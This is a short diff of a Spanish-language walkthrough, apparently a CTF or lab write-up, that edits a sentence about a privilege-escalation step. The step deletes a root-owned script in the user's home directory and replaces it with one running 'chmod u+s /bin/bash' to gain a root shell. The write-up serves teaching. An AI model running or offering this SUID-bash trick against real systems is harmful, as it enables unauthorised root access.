@@ -543,7 +543,8 @@ ls -la /home/juan/mensajes.sh
 ```
 -rwx--x--x 1 root root 181 Nov 21 21:03 /home/juan/mensajes.sh
 ```
-no puedo hacer otra cosa que leer,pero está en mi home, vamos a borrarlo y crear el mismo script con lo que quiera
+no puedo hacer otra cosa que leer,pero está en mi home, vamos a borrarlo y crear un archivo von el mismo nombre y dentro un script con lo que quiera:
+
 ```bash
 rm mensajes.sh #elimino el archivo
 echo 'chmod u+s /bin/bash' > mensajes.sh # doy permisos suid a la /bin/bash y lo guardo en un script de mismo nombre que el borrado
